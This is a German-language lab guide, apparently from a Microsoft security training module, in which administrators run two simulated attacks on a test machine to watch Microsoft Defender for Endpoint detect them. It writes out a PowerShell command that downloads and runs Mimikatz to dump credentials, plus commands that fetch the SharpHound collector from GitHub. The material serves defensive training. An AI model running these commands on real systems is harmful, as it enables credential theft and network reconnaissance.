# Demo zu Modul 2 – Abwehr von Bedrohungen mithilfe von Microsoft Defender for Endpoint

**Hinweis:** Der erfolgreiche Abschluss dieser Demo hängt davon ab, alle Schritte im  [Dokument](00-prerequisites.md) „Voraussetzungen“ abzuschließen.

## Simulierte Angriffe

In dieser Aufgabe führen Sie zwei simulierte Angriffe aus, um die Funktionen von Microsoft Defender for Endpoint zu erkunden.

1. Wenn Sie sich in Ihrem Browser noch nicht im Microsoft Defender XDR-Portal befinden, wechseln Sie unter (<https://security.microsoft.com>) zu Microsoft Defender XDR, während Sie als Admin für Ihren Mandanten angemeldet sind.

Sie führen die *simulierten* Angriffe mit *PowerShell* auf *WIN1* aus, um die Funktionen von Microsoft Defender for Endpoint zu erkunden.

`Attack 1: Mimikatz - Credential Dumping`

1. Geben Sie auf dem Computer *WIN1* die Zeichenfolge **Command** in die Suchleiste ein, und wählen Sie**Als Administrator ausführen** aus.

1. Kopieren Sie den folgenden Befehl, fügen Sie ihn in das Fenster **Administrator: Eingabeaufforderung** ein, und drücken Sie die **EINGABETASTE**, um ihn auszuführen.

    ```CommandPrompt
    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
    ```

1. Es sollte die Meldung *Zugriff verweigert* und eine Popupnachricht von `Microsoft Defender Antivirus, Windows Security Virus and threats protection` angezeigt werden, dass *Bedrohungen gefunden* wurden.

1. Schließen Sie das Fenster **Administrator: Eingabeaufforderung** durch Eingabe von **exit** und Drücken der **EINGABETASTE**.

`Attack 2: Bloodhound - Collection`

1. Geben Sie auf dem Computer *WIN1* die Zeichenfolge **PowerShell ** in die Suchleiste ein, und wählen Sie **Windows PowerShell** und dann **Als Administrator ausführen** aus.

1. Kopieren Sie die folgenden Befehle, fügen Sie sie in das Fenster **Administrator: Windows PowerShell** ein, und drücken Sie die **EINGABETASTE**, um sie auszuführen.

    ```PowerShell
    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

    >**Hinweis:** Es wird empfohlen, die Befehle einzeln zu kopieren, einzufügen und auszuführen. Dazu können Sie *Editor* öffnen und die Befehle in eine temporäre Datei kopieren. Der erste Befehl erstellt einen Ordner namens *ExternalPayloads* in dem Ordner, in dem sich der Ordner *Atomic Red Team* befindet. Der zweite Befehl lädt die Datei *SharpHound.ps1* aus dem GitHub-Repository *BloodHound* herunter und speichert sie im Ordner *ExternalPayloads*.

1. Es sollte eine Popupmeldung von `Windows Security Virus and threats protection` angezeigt werden, dass *Bedrohungen gefunden* wurden.

1. Kopieren Sie den folgenden Befehl, fügen Sie ihn in das Fenster **Administrator: Windows PowerShell** ein, und drücken Sie die **EINGABETASTE**, um sie auszuführen.

    ```PowerShell
    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
    ```

1. Wenn die Ausgabe *True* lautet, wurde die Datei mit den Schadsoftwarenutzdaten von Microsoft Defender Antivirus nicht entfernt. Wenn die Ausgabe *False* lautet, wurde die Datei mit den Schadsoftwarenutzdaten von Microsoft Defender Antivirus entfernt. Verwenden Sie die NACH-OBEN-TASTE, um den Befehl zu wiederholen, bis die Ausgabe *False* lautet.

## Damit haben Sie die Demo beendet
